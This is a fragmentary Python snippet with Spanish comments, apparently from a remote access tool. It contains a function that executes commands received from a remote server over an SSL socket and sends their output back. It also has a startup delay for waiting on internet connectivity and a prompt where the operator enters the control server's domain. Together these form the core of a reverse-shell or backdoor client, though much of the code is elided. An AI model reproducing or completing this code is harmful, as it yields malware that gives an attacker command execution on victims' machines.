...
def execute():
    ...
    Client_Socket_SSL.send(subprocess.getoutput(command_server).encode()) # ejecuta y envia al servidor
    
if __name__ == "__main__":

    #--------GLOBALS--------------------
   
    time.sleep(60)  #esperamos a que la maquina establezca conexion con internet
...
def get_Data():
    ...
    if(opt=='2'):
        address = input("Enter Domain Server ej = myserver.com \n")
        address = socket.gethostbyname(address)  #se resuelve la ip del dominio solicitado
